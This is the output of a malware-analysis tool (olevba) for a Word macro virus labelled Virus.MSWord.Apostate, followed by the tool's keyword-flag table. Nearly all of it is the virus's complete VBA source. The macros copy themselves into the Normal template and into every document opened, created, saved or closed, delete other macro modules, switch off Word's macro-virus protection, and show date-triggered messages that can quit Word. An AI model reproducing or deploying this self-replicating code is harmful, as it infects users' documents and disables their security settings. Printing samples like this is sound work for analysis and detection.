olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Apostate
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Apostate - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_New()

End Sub
-------------------------------------------------------------------------------
VBA MACRO god_2.bas 
in file: Virus.MSWord.Apostate - OLE stream: 'Macros/VBA/god_2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public n1$
Sub autoexec()
virus
mine
End Sub
Sub AutoOpen()
Call main
Call virus
End Sub
Sub main()
n$ = ActiveDocument.FullName
d$ = ActiveDocument.AttachedTemplate.Path
nor$ = ActiveDocument.AttachedTemplate.Name
m$ = d$ & "\" & nor$
On Error Resume Next
For Each n2 In Application.VBE.VBProjects
    For Each m1 In n2.VBComponents
       
       nam = m1.Name
       typ = m1.Type
        If nam = "god_2" Or typ = 100 Or nam = "hh" Then
            Else
            Application.OrganizerDelete Source:=m$, _
            Name:=nam, Object:=wdOrganizerObjectProjectItems

        End If
Next m1, n2
Application.OrganizerCopy Source:= _
     n$, Destination:= _
        m$, Name:= _
        "god_2", Object:=wdOrganizerObjectProjectItems

End Sub
Sub FileOpen()
On Error Resume Next
d$ = ActiveDocument.AttachedTemplate.Path
nor$ = ActiveDocument.AttachedTemplate.Name
m$ = d$ & "\" & nor$
open1 = Dialogs(wdDialogFileOpen).Show

If open1 = -1 Then
n1$ = ActiveDocument.FullName
    nm
    Application.OrganizerCopy Source:= _
    m$, Destination:= _
        n1$, Name:= _
        "god_2", Object:=wdOrganizerObjectProjectItems
End If
Call main

End Sub

Sub FileNew()
On Error Resume Next
d$ = ActiveDocument.AttachedTemplate.Path
nor$ = ActiveDocument.AttachedTemplate.Name
m$ = d$ & "\" & nor$
new1 = Dialogs(wdDialogFileNew).Show
If new1 = -1 Then
   n1$ = ActiveDocument.FullName
    nm
    Application.OrganizerCopy Source:= _
     m$, Destination:= _
        n1$, Name:= _
        "god_2", Object:=wdOrganizerObjectProjectItems
End If
Call main

End Sub
Sub FileNewDefault()
Documents.Add
d$ = ActiveDocument.AttachedTemplate.Path
nor$ = ActiveDocument.AttachedTemplate.Name
m$ = d$ & "\" & nor$
On Error Resume Next
   n1$ = ActiveDocument.FullName
    nm
    Application.OrganizerCopy Source:= _
     m$, Destination:= _
        n1$, Name:= _
        "god_2", Object:=wdOrganizerObjectProjectItems
Call main

End Sub
Sub FileClose()
d$ = ActiveDocument.AttachedTemplate.Path
nor$ = ActiveDocument.AttachedTemplate.Name
m$ = d$ & "\" & nor$
    On Error Resume Next
   n1$ = ActiveDocument.FullName
    nm
    Application.OrganizerCopy Source:= _
     m$, Destination:= _
        n1$, Name:= _
        "god_2", Object:=wdOrganizerObjectProjectItems
Call main
    WordBasic.FileClose
End Sub
Sub FileSave()
    d$ = ActiveDocument.AttachedTemplate.Path
    nor$ = ActiveDocument.AttachedTemplate.Name
    m$ = d$ & "\" & nor$
On Error Resume Next
   n1$ = ActiveDocument.FullName
    nm
    Application.OrganizerCopy Source:= _
     m$, Destination:= _
        n1$, Name:= _
        "god_2", Object:=wdOrganizerObjectProjectItems
Call main

ActiveDocument.Save
End Sub

Sub mine()

a = Date
If Month(a) = 12 And Day(a) = 23 Then
   MsgBox "今天是我的生日，大家放假吧！", , "God"
   Application.Quit
ElseIf Month(a) = 3 And Day(a) = 4 Then
    MsgBox "祝你生日快乐，不管你在哪儿。", , "God"
Else
    MsgBox "你还好吗？", , "God"
End If
 End Sub
Sub virus()
    With Options
        
        .VirusProtection = False
     
    End With
    
End Sub
Sub nm()
For Each n2 In Application.VBE.VBProjects
 For Each m1 In n2.VBComponents
      nam = m1.Name
        typ = m1.Type
        If nam = "god_2" Or typ = 100 Or nam = "hh" Then
            Else
            Application.OrganizerDelete Source:=n1$, _
            Name:=nam, Object:=wdOrganizerObjectProjectItems

        End If
Next m1, n2
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

